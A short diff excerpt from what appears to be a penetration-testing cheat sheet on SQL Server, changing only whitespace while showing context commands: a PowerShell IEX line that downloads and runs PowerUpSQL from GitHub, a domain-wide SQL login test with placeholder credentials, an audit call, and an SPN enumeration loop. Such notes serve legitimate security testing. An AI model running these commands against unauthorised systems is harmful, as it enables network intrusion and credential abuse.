@@ -288,7 +288,7 @@ MySQL
   `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`  
   `$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username "domain\user" -password "passw0rd123" | Where-Object {$_.Status -like "Accessible"}`  
   `Invoke-SQLAudit -Verbose -Instance "servername.domain.local,1433"`  
-  Manually get all SQL SPNs from list of reachable SQL servers:
+  Manually get all SQL SPNs from list of reachable SQL servers:   
   `# add all sql targets to a file called sql_hosts.txt`   
   `# get all SPNs into a file:`   
   `foreach($entry in (Get-Content .\sql_hosts.txt)){ $dnsname = (Resolve-DnsName $entry).Namehost; setspn -q *MSSQL*/*$dnsname* | select-string "MSSQL" | Out-File sql_instances.txt -Append }`   
